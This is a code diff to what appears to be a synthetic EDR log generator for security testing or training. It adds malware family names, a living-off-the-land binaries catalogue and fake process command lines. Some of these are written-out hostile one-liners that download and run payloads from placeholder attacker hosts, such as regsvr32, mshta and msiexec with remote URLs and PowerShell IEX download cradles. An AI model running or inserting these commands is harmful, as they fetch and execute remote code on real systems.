@@ -34,31 +34,61 @@ const generateParentProcess = () => {
     return getRandomFromArray(parentProcesses);
 };
 
-// Generate realistic command lines
+// 2024-2025 malware families (updated threat landscape)
+const MALWARE_FAMILIES_2025 = {
+    Ransomware: ['RansomHub', 'Play Ransomware', 'Akira', 'LockBit 3.0', 'Hunters International', 'Black Basta', 'Meow'],
+    Infostealer: ['LummaC2', 'Vidar', 'MetaStealer', 'SnakeKeylogger', 'XLoader', 'Formbook', 'AgentTesla'],
+    Loader: ['AsyncRAT', 'Latrodectus', 'DarkGate', 'IcedID', 'QakBot'],
+    C2Framework: ['Sliver', 'Havoc C2', 'Brute Ratel C4', 'Mythic', 'Cobalt Strike', 'NightHawk'],
+    Trojan: ['AsyncRAT', 'SectopRAT', 'RemcosRAT', 'NjRAT', 'DarkComet'],
+    CredentialDumper: ['NanoDump', 'HandleKatz', 'SilentProcessExit', 'Mimikatz'],
+    Wiper: ['CaddyWiper', 'HermeticWiper', 'WhisperGate'],
+};
+
+// 2024 LOLBins catalogue
+const LOLBINS_2024 = [
+    'certutil.exe -decode payload.txt payload.exe',
+    'msiexec.exe /quiet /i http://attacker.com/payload.msi',
+    'mshta.exe http://attacker.com/script.hta',
+    'odbcconf.exe /a {REGSVR payload.dll}',
+    'mavinject.exe <PID> /INJECTRUNNING payload.dll',
+    'forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c "cmd /c payload.exe"',
+    'finger.exe user@attacker.com',
+    'colorcpl.exe',
+    'regsvr32.exe /s /n /u /i:http://attacker.com/script.sct scrobj.dll',
+    'wmic.exe process call create "powershell -enc <base64>"',
+];
+
+// Generate realistic command lines — updated for 2024 TTPs
 const generateCommandLine = (fileName, malwareType) => {
     const commands = {
         'Ransomware': [
-            `"${fileName}" -encrypt -all`,
-            `powershell.exe -enc ${btoa('malicious powershell command')}`,
-            `${fileName} /silent /encrypt`
+            `"${fileName}" -encrypt -all -key 0x${Math.random().toString(16).substring(2, 18)}`,
+            `powershell.exe -enc ${btoa('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://c2/payload")')}`,
+            `certutil.exe -decode C:\\Users\\Public\\stage.txt "${fileName}"`,
+            `msiexec.exe /quiet /i "http://185.${Math.floor(Math.random()*100)+100}.${Math.floor(Math.random()*255)}.1/update.msi"`,
+        ],
+        'Infostealer': [
+            `"${fileName}" --log C:\\ProgramData\\log.dat --browsers --crypto`,
+            `powershell.exe -WindowStyle Hidden -ep Bypass -c "IEX (iwr 'http://c2/lumma.ps1')"`,
+            `${fileName} -s http://c2.attacker.io/gate.php -o C:\\Temp\\out.zip`,
+        ],
+        'C2Framework': [
+            `"${fileName}" -connect ${Math.floor(Math.random()*100)+100}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1:443`,
+            `rundll32.exe ${fileName},StartW`,
+            `regsvr32.exe /s /n /u /i:http://c2server.net/beacon.sct scrobj.dll`,
+        ],
+        'Loader': [
+            `wmic.exe process call create "cmd /c ${fileName}"`,
+            `mshta.exe "javascript:a=new ActiveXObject('Wscript.Shell');a.run('${fileName}');close()"`,
+            `${fileName} --inject explorer.exe --payload shellcode.bin`,
         ],
         'Trojan': [
             `"${fileName}" -install -hide`,
-            `${fileName} /quiet /background`,
-            `rundll32.exe ${fileName},DllEntryPoint`
+            `$fileName /quiet /background`,
+            `rundll32.exe ${fileName},DllEntryPoint`,
         ],
-        'RAT': [
-            `"${fileName}" -connect 192.168.1.100:4444`,
-            `${fileName} -server -port 8080`,
-            `powershell.exe -WindowStyle Hidden -File ${fileName}`
-        ],
-        'Cryptominer': [
-            `"${fileName}" -pool stratum+tcp://pool.com:4444`,
-            `${fileName} --donate-level=0 --pool=mining.com`,
-            `powershell.exe -ExecutionPolicy Bypass -File ${fileName}`
-        ]
     };
-    
     const typeCommands = commands[malwareType] || commands['Trojan'];
     return getRandomFromArray(typeCommands);
 };
@@ -78,16 +108,25 @@ export const generateEnhancedEdrLog = async (options = {}) => {
     const destinationIp = `203.0.113.${Math.floor(Math.random() * 255)}`;
     const destinationPort = getRandomFromArray([80, 443, 8080, 4444, 9999]);
 
+    // Pick malware family — 2024-2025 updated
+    const malwareCategoryKeys = Object.keys(MALWARE_FAMILIES_2025);
+    const malwareCategory = getRandomFromArray(malwareCategoryKeys);
+    const malwareFamilyFallback = getRandomFromArray(MALWARE_FAMILIES_2025[malwareCategory]);
+
     let maliciousFile = null;
     try {
         maliciousFile = await maliciousHashService.getRandomMaliciousHash();
+        // Override malware family with 2024-2025 families for realism
+        if (maliciousFile) {
+            maliciousFile.malware_family = malwareFamilyFallback;
+        }
     } catch (error) {
         console.warn('[EDR LOG] Failed to get malicious hash, using fallback:', error);
         maliciousFile = {
-            file_name: 'malicious.exe',
-            sha256: '5d41402abc4b2a76b9719d911017c592',
-            malware_family: 'Trojan',
-            file_size: 2048000
+            file_name: getRandomFromArray(['svcupdate.exe', 'wmiprvse32.exe', 'RuntimeBroker_.exe', 'SearchUI_.exe', 'update_helper.exe']),
+            sha256: Array.from({length: 64}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join(''),
+            malware_family: malwareFamilyFallback,
+            file_size: Math.floor(Math.random() * 3000000) + 200000
         };
     }
 
